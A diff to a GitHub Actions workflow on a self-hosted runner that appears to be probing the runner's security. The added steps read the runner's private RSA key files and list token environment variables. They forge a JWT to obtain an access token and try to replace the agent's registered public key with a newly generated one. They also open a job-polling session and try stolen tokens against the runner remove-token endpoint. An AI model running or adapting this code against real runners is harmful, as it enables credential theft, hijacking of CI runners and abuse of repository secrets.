@@ -3,14 +3,50 @@ jobs:
   find:
     runs-on: self-hosted
     steps:
-      - name: Probe plan APIs and capture runtime token
+      - name: Capture runtime token and test PUT key substitution
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
           pip3 install cryptography PyJWT --break-system-packages 2>/dev/null
 
+          # === Probe 1: Capture ACTIONS_RUNTIME_TOKEN safely ===
+          echo "=== ALL ENV VARS CONTAINING TOKEN/RUNTIME/ACTIONS ==="
+          printenv | grep -iE 'RUNTIME|TOKEN|ACTIONS' | sed 's/=.*/=PRESENT/' || echo "grep: no matches found (exit 1 suppressed)"
+
+          echo ""
+          echo "=== ACTIONS_RUNTIME_TOKEN direct ==="
+          RT=$(printenv ACTIONS_RUNTIME_TOKEN 2>/dev/null || echo "")
+          if [ -n "$RT" ]; then
+            echo "Length: ${#RT}"
+            echo "Decoded claims:"
+            echo $RT | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "not a standard JWT"
+            echo ""
+            echo "Test against remove-token REST endpoint:"
+            curl -s -w "\nHTTP: %{http_code}" -X POST \
+              -H "Authorization: Bearer $RT" \
+              -H "Accept: application/vnd.github.v3+json" \
+              https://api.github.com/repos/poweriswill/oppo/actions/runners/remove-token || true
+          else
+            echo "ACTIONS_RUNTIME_TOKEN not set"
+          fi
+
+          echo ""
+          echo "=== GITHUB_TOKEN direct ==="
+          GT=$(printenv GITHUB_TOKEN 2>/dev/null || echo "")
+          if [ -n "$GT" ]; then
+            echo "Length: ${#GT}"
+            echo "Test GITHUB_TOKEN against remove-token endpoint:"
+            curl -s -w "\nHTTP: %{http_code}" -X POST \
+              -H "Authorization: token $GT" \
+              -H "Accept: application/vnd.github.v3+json" \
+              https://api.github.com/repos/poweriswill/oppo/actions/runners/remove-token || true
+          else
+            echo "GITHUB_TOKEN not set via printenv"
+          fi
+
           python3 -c "
           import json, time, base64, jwt, urllib.request, urllib.parse, urllib.error
           from cryptography.hazmat.backends import default_backend
+          from cryptography.hazmat.primitives.asymmetric import rsa
           from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers, RSAPublicNumbers
 
           with open('$RUNNER_BASE/.credentials_rsaparams', encoding='utf-8-sig') as f: params = json.load(f)
@@ -18,6 +54,10 @@ jobs:
           with open('$RUNNER_BASE/.runner', encoding='utf-8-sig') as f: runner = json.load(f)
 
           def b64i(b): b += '='*(4-len(b)%4); return int.from_bytes(base64.urlsafe_b64decode(b),'big')
+          def int_to_b64(n):
+            length = (n.bit_length()+7)//8
+            return base64.urlsafe_b64encode(n.to_bytes(length,'big')).rstrip(b'=').decode()
+
           priv = RSAPrivateNumbers(b64i(params['p']),b64i(params['q']),b64i(params['d']),b64i(params['dp']),b64i(params['dq']),b64i(params['inverseQ']),RSAPublicNumbers(b64i(params['exponent']),b64i(params['modulus']))).private_key(default_backend())
 
           client_id = creds['data']['clientId']
@@ -29,69 +69,65 @@ jobs:
           now = int(time.time())
           tok = jwt.encode({'sub':client_id,'iss':client_id,'aud':auth_url,'nbf':now,'exp':now+270,'jti':str(now)}, priv, algorithm='RS256')
           data = urllib.parse.urlencode({'grant_type':'client_credentials','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':tok,'client_id':client_id}).encode()
-          req = urllib.request.Request(auth_url, method='POST', data=data, headers={'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json'})
-          with urllib.request.urlopen(req) as r: access_token = json.loads(r.read())['access_token']
+          with urllib.request.urlopen(urllib.request.Request(auth_url,method='POST',data=data,headers={'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json'})) as r:
+            access_token = json.loads(r.read())['access_token']
           print('Token obtained')
 
-          h = {'Authorization': f'Bearer {access_token}', 'Accept': 'application/json'}
+          h = {'Authorization': f'Bearer {access_token}', 'Accept': 'application/json', 'Content-Type': 'application/json'}
 
-          # Get FULL own agent response (no truncation)
-          print('\n=== FULL own agent details ===')
+          # === Probe 2: PUT key substitution using correct structure from GET response ===
+          new_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
+          pub = new_key.public_key().public_numbers()
+
+          print('\n=== PUT agent update — structure matching GET response ===')
+          # Use the exact structure the server returned in GET
+          put_body = {
+            'id': agent_id,
+            'name': '192',
+            'version': '2.333.1',
+            'osDescription': 'Darwin 25.3.0',
+            'ephemeral': False,
+            'disableUpdate': False,
+            'maxParallelism': 1,
+            'labels': [
+              {'name': 'self-hosted', 'type': 'system'},
+              {'name': 'macOS', 'type': 'system'},
+              {'name': 'ARM64', 'type': 'system'}
+            ],
+            'authorization': {
+              'clientId': client_id,
+              'publicKey': {
+                'exponent': int_to_b64(pub.e),
+                'modulus': int_to_b64(pub.n)
+              }
+            }
+          }
           try:
-            req = urllib.request.Request(f'{server_url}_apis/distributedtask/pools/{pool_id}/agents/{agent_id}?api-version=6.0-preview&includeAssignedRequest=true', headers=h)
-            with urllib.request.urlopen(req) as r:
-              full = json.loads(r.read().decode())
-              print(json.dumps(full, indent=2))
-          except urllib.error.HTTPError as e: print(f'HTTP {e.code}:', e.read().decode()[:500])
+            req = urllib.request.Request(f'{server_url}_apis/distributedtask/pools/{pool_id}/agents/{agent_id}?api-version=6.0-preview', method='PUT', data=json.dumps(put_body).encode(), headers=h)
+            with urllib.request.urlopen(req) as r: print('PUT SUCCESS:', r.read().decode()[:500])
+          except urllib.error.HTTPError as e: print(f'HTTP {e.code}:', e.read().decode()[:400])
 
-          # Probe plan APIs using planId from assignedRequest
-          PLAN_ID = '2743ceea-8d2d-4522-be6c-64c4625e07f0'
-          JOB_ID  = 'e471f65f-98f5-5a96-a799-e4cdbf1c02fd'
+          # === Probe 3: Try creating a message session (how the runner polls for jobs) ===
+          print('\n=== POST create message session ===')
+          session_body = {
+            'ownerName': '192',
+            'agent': {'id': agent_id, 'name': '192'},
+            'useFipsEncryption': False
+          }
+          try:
+            req = urllib.request.Request(f'{server_url}_apis/distributedtask/pools/{pool_id}/sessions?api-version=6.0-preview', method='POST', data=json.dumps(session_body).encode(), headers=h)
+            with urllib.request.urlopen(req) as r: print('SESSION SUCCESS:', r.read().decode()[:1000])
+          except urllib.error.HTTPError as e: print(f'HTTP {e.code}:', e.read().decode()[:400])
 
-          # 1. Plan timeline records
-          print('\n=== GET plan timeline ===')
-          for hub in ['pipelines', 'build', 'Gates', 'github']:
+          # === Probe 4: Raw OAuth token from .credentials against api.github.com ===
+          print('\n=== Raw .credentials Token against REST API ===')
+          raw_token = creds['data'].get('Token','') or creds['data'].get('token','')
+          if raw_token:
+            print(f'Raw token present, length: {len(raw_token)}')
             try:
-              url = f'{server_url}_apis/distributedtask/hubs/{hub}/plans/{PLAN_ID}/timelines/{PLAN_ID}?api-version=6.0-preview'
-              req = urllib.request.Request(url, headers=h)
-              with urllib.request.urlopen(req) as r: print(f'hub={hub}:', r.read().decode()[:500])
-            except urllib.error.HTTPError as e: print(f'hub={hub}: HTTP {e.code}:', e.read().decode()[:200])
-
-          # 2. Plan finish/complete endpoint
-          print('\n=== GET plan details ===')
-          for hub in ['pipelines', 'build', 'Gates']:
-            try:
-              url = f'{server_url}_apis/distributedtask/hubs/{hub}/plans/{PLAN_ID}?api-version=6.0-preview'
-              req = urllib.request.Request(url, headers=h)
-              with urllib.request.urlopen(req) as r: print(f'hub={hub}:', r.read().decode()[:500])
-            except urllib.error.HTTPError as e: print(f'hub={hub}: HTTP {e.code}:', e.read().decode()[:200])
-
-          # 3. Try to get job record
-          print('\n=== GET job record ===')
-          for hub in ['pipelines', 'build']:
-            try:
-              url = f'{server_url}_apis/distributedtask/hubs/{hub}/plans/{PLAN_ID}/jobs/{JOB_ID}?api-version=6.0-preview'
-              req = urllib.request.Request(url, headers=h)
-              with urllib.request.urlopen(req) as r: print(f'hub={hub}:', r.read().decode()[:500])
-            except urllib.error.HTTPError as e: print(f'hub={hub}: HTTP {e.code}:', e.read().decode()[:200])
-          "
-
-          # Capture ACTIONS_RUNTIME_TOKEN correctly
-          echo ""
-          echo "=== ACTIONS_RUNTIME_TOKEN via printenv ==="
-          RT=$(printenv ACTIONS_RUNTIME_TOKEN 2>/dev/null)
-          if [ -n "$RT" ]; then
-            echo "Token found, length: ${#RT}"
-            echo "Decoded header+payload:"
-            echo $RT | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
-            echo ""
-            echo "=== Test against remove-token REST endpoint ==="
-            curl -s -w "\nHTTP: %{http_code}" -X POST \
-              -H "Authorization: Bearer $RT" \
-              -H "Accept: application/vnd.github.v3+json" \
-              https://api.github.com/repos/poweriswill/oppo/actions/runners/remove-token
-          else
-            echo "Still empty via printenv"
-            echo "=== All env vars with 'RUNTIME' or 'TOKEN' in name ==="
-            printenv | grep -iE 'RUNTIME|TOKEN|ACTIONS' | sed 's/=.*/=***REDACTED***/'
-          fi
+              req = urllib.request.Request('https://api.github.com/repos/poweriswill/oppo/actions/runners/remove-token', method='POST', headers={'Authorization': f'Bearer {raw_token}', 'Accept': 'application/vnd.github.v3+json'})
+              with urllib.request.urlopen(req) as r: print('SUCCESS:', r.read().decode()[:500])
+            except urllib.error.HTTPError as e: print(f'HTTP {e.code}:', e.read().decode()[:300])
+          else:
+            print('No raw token field in .credentials data:', list(creds['data'].keys()))
+          " || true
